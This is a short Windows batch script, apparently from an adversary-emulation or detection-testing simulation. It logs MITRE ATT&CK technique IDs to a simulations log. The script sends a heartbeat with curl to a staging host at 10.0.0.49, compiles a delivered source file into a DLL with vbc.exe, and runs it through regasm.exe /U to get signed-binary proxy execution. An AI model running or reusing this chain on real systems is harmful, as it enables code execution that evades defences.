@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\9830\8421fff8
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?9830-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=expressvp.txt
SET njozco=file.txt
SET kkjwr=9830
SET ogwfhb=%APPDATA%\%ufeybybm%\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: script_start=>> "!ogwfhb!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: heartbeat_sent=>> "!ogwfhb!" 2>nul
cd /d "!recnn!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: directory_changed=!recnn!>> "!ogwfhb!" 2>nul

SET jttbt=1
SET xzzux=
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\vbc.exe /target:library /out:"!hpnjatpj!" "!njozco!"
IF NOT %ERRORLEVEL% EQU 0 (
    SET jttbt=0
    SET xzzux=compile_failed
)
echo [!DATE! !TIME!][TTP][!lqyereup!][!kkjwr!]: T1500|Compile After Delivery=!jttbt!:!xzzux!>> "!ogwfhb!" 2>nul
IF !jttbt! EQU 0 EXIT /B 1
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: dll_compiled=!hpnjatpj!>> "!ogwfhb!" 2>nul

SET jttbt=1
SET xzzux=
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U "!hpnjatpj!"
IF NOT %ERRORLEVEL% EQU 0 (
    SET jttbt=0
    SET xzzux=execution_failed
)
echo [!DATE! !TIME!][TTP][!lqyereup!][!kkjwr!]: T1218|Signed Binary Proxy Execution=!jttbt!:!xzzux!>> "!ogwfhb!" 2>nul
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: regasm_executed=!ERRORLEVEL!>> "!ogwfhb!" 2>nul